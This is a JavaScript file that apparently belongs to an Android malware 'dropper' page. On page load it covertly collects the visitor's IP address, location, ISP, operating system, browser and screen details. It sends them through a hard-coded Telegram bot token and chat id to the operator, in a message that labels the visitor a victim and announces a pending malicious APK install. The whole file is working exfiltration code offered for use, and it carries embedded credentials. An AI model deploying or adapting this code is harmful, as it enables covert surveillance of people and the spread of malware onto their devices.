//bot token
var telegram_bot_id = "8047003776:AAHRdoqNSa42RvMU_LTUtEFT2PnTWciT1vY";
//chat id
var chat_id = 5889938125;
// api 
const url = "http://ip-api.com/json/";



var DEV = window.Device;
var BODY = document.body;
var px = 'px';

async function gatdata() {
    let prom = await fetch(url);
    let data = await prom.json();
    // console.log(data)
    var ready = function () {
        message = `☠️...........Dropper Apk Is Complete.............☠️\n\nPlease Wait Till Victim Main Apk Install You Will Get Notification If Apk Install Complete \n\n⚠️ Some Information About The Victim⚠️\n\n📱💻..........Operating System Info...........📱💻\n\n🔵⏩  OS Name : ${DEV.OS.name}\n🔵⏩  OS Version : ${DEV.OS.name} ${DEV.OS.version}\n\n🔎🌐................Browser Info...................🌐🔍\n\n🔵⏩  Browser Name : ${DEV.browser.name}\n🔵⏩  Major : ${DEV.browser.major}\n🔵⏩  Browser Version : ${DEV.browser.version}\n🔵⏩  Architecture (CPU) : ${DEV.CPU} BIT\n\n🔎🌐..........Device Resolution.........🌐🔍\n\n🔵⏩  Screen Width : ${DEV.resolution.width} px\n🔵⏩  Screen Height : ${DEV.resolution.height}px\n🔎🌐.........OrientationNew........🌐🔍\n\n🔵⏩   Angle : ${DEV.orientation.angle}º\n🔵⏩   Type : ${DEV.orientation.type}\n\n🔎🌐...............Victem Ip Info...........🌐🔍\n\n🔵⏩  Ip : ${data.query}\n🔵⏩  Country : ${data.country}\n🔵⏩  CountryCode : ${data.countryCode}\n🔵⏩  regionName :${data.regionName}\n🔵⏩  Org : ${data.org}\n🔵⏩  City : ${data.city}\n🔵⏩  Zip Code : ${data.zip}\n🔵⏩  ISP : ${data.isp}
      `;
    };
    var sender = async function () {
        ready();
        var settings = {
            "async": true,
            "crossDomain": true,
            "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "cache-control": "no-cache"
            },
            "data": JSON.stringify({
                "chat_id": chat_id,
                "text": message
            })
        };
        $.ajax(settings).done(function (response) {
            console.log(response);
        });
        // document.getElementById("name").value = "";
        // document.getElementById("email").value = "";
        // document.getElementById("message").value = "";
        return false;
    };
    sender()
}
gatdata()

